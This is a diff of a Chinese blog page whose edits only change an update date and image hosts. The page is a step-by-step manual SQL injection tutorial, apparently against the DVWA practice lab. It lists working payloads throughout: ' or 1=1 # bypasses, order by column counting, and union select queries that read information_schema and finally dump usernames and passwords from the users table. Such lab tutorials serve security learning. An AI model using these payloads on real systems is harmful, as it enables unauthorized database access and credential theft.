@@ -248,7 +248,7 @@
             
               <p class="note note-info">
                 
-                  本文最后更新于：2020年9月18日 下午
+                  本文最后更新于：2022年3月27日 晚上
                 
               </p>
             
@@ -269,53 +269,53 @@
 </ul>
 <p>一般可以通过直接输入单引号来判断是否存在注入点</p>
 <p>通过输入3和1+2判断注入为字符型注入，若为数字型注入，则3和1+2输出一样</p>
-<p><img src="https://gitee.com/LRainner/blogImage/raw/master/img/sql%E6%B3%A8%E5%85%A5%E8%BE%93%E5%85%A51.png" srcset="/img/loading.gif"></p>
-<p><img src="https://gitee.com/LRainner/blogImage/raw/master/img/sql%E6%B3%A8%E5%85%A5%E8%BE%93%E5%85%A53.png" srcset="/img/loading.gif"></p>
-<p><img src="https://gitee.com/LRainner/blogImage/raw/master/img/sql%E6%B3%A8%E5%85%A5%E8%BE%93%E5%85%A51+3.png" srcset="/img/loading.gif"></p>
+<p><img src="https://raw.githubusercontent.com/LRainner/Pic/main/img/sql%E6%B3%A8%E5%85%A5%E8%BE%93%E5%85%A51.png" srcset="/img/loading.gif"></p>
+<p><img src="https://raw.githubusercontent.com/LRainner/Pic/main/img/sql%E6%B3%A8%E5%85%A5%E8%BE%93%E5%85%A53.png" srcset="/img/loading.gif"></p>
+<p><img src="https://raw.githubusercontent.com/LRainner/Pic/main/img/sql%E6%B3%A8%E5%85%A5%E8%BE%93%E5%85%A51+3.png" srcset="/img/loading.gif"></p>
 <h2 id="字符型注入"><a href="#字符型注入" class="headerlink" title="字符型注入"></a>字符型注入</h2><p>字符型注入最关键的是如何闭合SQL语句以及注释多余的代码</p>
 <blockquote>
 <p>SELECT first_name, last_name FROM users WHERE user_id = ‘$id’</p>
 </blockquote>
 <ul>
-<li><p>‘ or 1=1 or ‘<br>SELECT first_name, last_name FROM users WHERE user_id = ‘ ‘ or 1=1 or ‘ ‘<br>False or True or False<br><img src="https://gitee.com/LRainner/blogImage/raw/master/img/sqllow1.png" srcset="/img/loading.gif"></p>
+<li><p>‘ or 1=1 or ‘<br>SELECT first_name, last_name FROM users WHERE user_id = ‘ ‘ or 1=1 or ‘ ‘<br>False or True or False<br><img src="https://raw.githubusercontent.com/LRainner/Pic/main/img/sqllow1.png" srcset="/img/loading.gif"></p>
 </li>
-<li><p>1’ or ‘1’ =’1<br>SELECT first_name, last_name FROM users WHERE user_id = ‘1’ or ‘1’ =’1’<br>True or True<br><img src="https://gitee.com/LRainner/blogImage/raw/master/img/sqllow3.png" srcset="/img/loading.gif"></p>
+<li><p>1’ or ‘1’ =’1<br>SELECT first_name, last_name FROM users WHERE user_id = ‘1’ or ‘1’ =’1’<br>True or True<br><img src="https://raw.githubusercontent.com/LRainner/Pic/main/img/sqllow3.png" srcset="/img/loading.gif"></p>
 </li>
 <li><p>‘or 1=1 #<br>SELECT first_name, last_name FROM users WHERE user_id = ‘’or 1=1 #’</p>
-<p># 为注释<br>False or True<br><img src="https://gitee.com/LRainner/blogImage/raw/master/img/sqllow2.png" srcset="/img/loading.gif"></p>
+<p># 为注释<br>False or True<br><img src="https://raw.githubusercontent.com/LRainner/Pic/main/img/sqllow2.png" srcset="/img/loading.gif"></p>
 </li>
-<li><p>‘or 1=1 –<br>SELECT first_name, last_name FROM users WHERE user_id = ‘’or 1=1 – ‘<br>– （有空格）也是注释<br>False or True<br><img src="https://gitee.com/LRainner/blogImage/raw/master/img/sqllow5.png" srcset="/img/loading.gif"></p>
+<li><p>‘or 1=1 –<br>SELECT first_name, last_name FROM users WHERE user_id = ‘’or 1=1 – ‘<br>– （有空格）也是注释<br>False or True<br><img src="https://raw.githubusercontent.com/LRainner/Pic/main/img/sqllow5.png" srcset="/img/loading.gif"></p>
 </li>
 </ul>
 <h2 id="判断数据库字段数"><a href="#判断数据库字段数" class="headerlink" title="判断数据库字段数"></a>判断数据库字段数</h2><ol>
 <li>1’ order by 2 #</li>
 </ol>
-<p><img src="https://gitee.com/LRainner/blogImage/raw/master/img/sqllow6.png" srcset="/img/loading.gif"></p>
+<p><img src="https://raw.githubusercontent.com/LRainner/Pic/main/img/sqllow6.png" srcset="/img/loading.gif"></p>
 <ol start="2">
 <li>1’ order by 3 #</li>
 </ol>
-<p><img src="https://gitee.com/LRainner/blogImage/raw/master/img/sqllow7.png" srcset="/img/loading.gif"></p>
+<p><img src="https://raw.githubusercontent.com/LRainner/Pic/main/img/sqllow7.png" srcset="/img/loading.gif"></p>
 <p>判断数据库字段数为2</p>
 <h2 id="确定回显位置（SQL语句查询后显示的位置）"><a href="#确定回显位置（SQL语句查询后显示的位置）" class="headerlink" title="确定回显位置（SQL语句查询后显示的位置）"></a>确定回显位置（SQL语句查询后显示的位置）</h2><blockquote>
 <p>1’ union select 1,2 #</p>
 </blockquote>
-<p><img src="https://gitee.com/LRainner/blogImage/raw/master/img/sqllow8.png" srcset="/img/loading.gif"></p>
+<p><img src="https://raw.githubusercontent.com/LRainner/Pic/main/img/sqllow8.png" srcset="/img/loading.gif"></p>
 <h2 id="查询当前用户名和数据库"><a href="#查询当前用户名和数据库" class="headerlink" title="查询当前用户名和数据库"></a>查询当前用户名和数据库</h2><blockquote>
 <p>1’ union select user(),database() #</p>
 </blockquote>
-<p><img src="https://gitee.com/LRainner/blogImage/raw/master/img/sqllow9.png" srcset="/img/loading.gif"></p>
+<p><img src="https://raw.githubusercontent.com/LRainner/Pic/main/img/sqllow9.png" srcset="/img/loading.gif"></p>
 <h2 id="获取数据库中的表"><a href="#获取数据库中的表" class="headerlink" title="获取数据库中的表"></a>获取数据库中的表</h2><blockquote>
 <p>1’ union select 1,group_concat(table_name) from information_schema.tables where table_schema=database()#</p>
 </blockquote>
-<p><img src="https://gitee.com/LRainner/blogImage/raw/master/img/sqllow10.png" srcset="/img/loading.gif"></p>
+<p><img src="https://raw.githubusercontent.com/LRainner/Pic/main/img/sqllow10.png" srcset="/img/loading.gif"></p>
 <h2 id="获取表中的字段名"><a href="#获取表中的字段名" class="headerlink" title="获取表中的字段名"></a>获取表中的字段名</h2><blockquote>
 <p>1’ union select 1, group_concat(column_name) from information_schema.columns where table_name=’users’#</p>
 </blockquote>
-<p><img src="https://gitee.com/LRainner/blogImage/raw/master/img/sqllow11.png" srcset="/img/loading.gif"></p>
+<p><img src="https://raw.githubusercontent.com/LRainner/Pic/main/img/sqllow11.png" srcset="/img/loading.gif"></p>
 <h2 id="获取字段中的数据"><a href="#获取字段中的数据" class="headerlink" title="获取字段中的数据"></a>获取字段中的数据</h2><blockquote>
 <p>1’ union select user,password from users#</p>
 </blockquote>
-<p><img src="https://gitee.com/LRainner/blogImage/raw/master/img/sqllow12.png" srcset="/img/loading.gif"></p>
+<p><img src="https://raw.githubusercontent.com/LRainner/Pic/main/img/sqllow12.png" srcset="/img/loading.gif"></p>
 
             </div>
             <hr>
